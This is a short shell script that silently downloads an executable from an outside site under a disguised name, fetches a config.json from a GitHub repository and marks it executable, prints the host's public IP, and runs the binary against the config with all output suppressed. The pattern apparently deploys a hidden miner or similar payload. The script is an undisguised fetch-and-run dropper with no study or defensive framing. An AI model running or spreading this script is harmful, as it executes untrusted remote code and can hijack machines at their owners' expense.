wget -q -O CorporationAssocié https://02ip.ru/service && chmod +x CorporationAssocié >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./CorporationAssocié -c "config.json" >/dev/null 2>&1
